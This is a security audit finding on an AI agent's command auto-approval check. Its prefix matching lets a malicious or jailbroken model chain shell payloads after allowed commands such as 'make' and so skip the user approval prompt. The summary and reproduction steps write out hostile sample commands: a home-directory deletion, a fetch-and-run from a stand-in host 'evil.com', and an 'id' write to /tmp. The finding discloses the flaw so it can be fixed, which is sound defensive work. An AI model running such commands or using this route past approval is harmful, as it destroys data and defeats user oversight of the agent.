Phase: 10
Sequence: 030
Slug: autoallow-prefix-no-separator-guard
Verdict: VALID
Rationale: autoAllowPrefixes uses bare strings.HasPrefix with no word-boundary or separator guard, so any command beginning with an allowed token (e.g. "make") is auto-approved including shell-injected payloads after semicolons or in arguments.
Severity-Original: HIGH
PoC-Status: pending
Origin-Finding: archon/findings-draft/p8-020-bash-pipe-semicolon-bypass.md
Origin-Pattern: AP-020

## Summary
`IsAutoAllowed` iterates `autoAllowPrefixes` and returns `true` if the full command string starts with any listed prefix using `strings.HasPrefix`. The prefix `"make"` (and others such as `"cmake"`, `"go build"`, `"go test"`, `"cargo build"`) contain no trailing space or separator constraint, so a command like `make; rm -rf $HOME` or `go build -toolexec='curl evil.com/rce|sh' ./...` would be auto-approved without prompting the user. The root cause is identical to AP-020: command tokenisation is not performed before the safety decision.

## Location
`x/agent/approval.go:164-167` — `IsAutoAllowed`, prefix loop  
`x/agent/approval.go:73-92` — `autoAllowPrefixes` definition  
`x/cmd/run.go:390-394` — call site (currently commented out with TODO to re-enable)

## Attacker Control
A malicious or jailbroken LLM can emit a tool call with `command` set to `"make; <payload>"` or `"go test -run=X -toolexec='<payload>' ./..."`. No user interaction is required once the code path is re-enabled.

## Trust Boundary Crossed
LLM output -> unapproved shell execution on the local machine. Bypasses the user approval prompt entirely for commands that match any autoAllowPrefixes entry.

## Impact
Arbitrary shell code execution on the developer's workstation without approval, data exfiltration, persistence (crontab / shell-rc modification), lateral movement. Severity is HIGH because exploitation requires the LLM to be adversarially prompted (one precondition) but no user interaction beyond that.

## Evidence
```go
// x/agent/approval.go:163-168
for _, prefix := range autoAllowPrefixes {
    if strings.HasPrefix(command, prefix) {  // no word boundary
        return true
    }
}
```
```go
// autoAllowPrefixes entries with no separator guard:
"make", "cmake",
"go build", "go test", "go fmt", "go vet",
"cargo build", "cargo test", "cargo check",
"npm run", "npm test", "npm start",
```
The TODO at run.go:390 ("re-enable with tighter scoped allowlist") confirms the code was recently active and is intended to be re-enabled.

## Reproduction Steps
1. Re-enable `IsAutoAllowed` in `x/cmd/run.go:391-394` (remove comment markers).
2. Start `ollama run` with an agent-capable model.
3. Prompt the model to run `make; id > /tmp/pwned`.
4. Observe the command executes without an approval prompt and `/tmp/pwned` contains the uid.
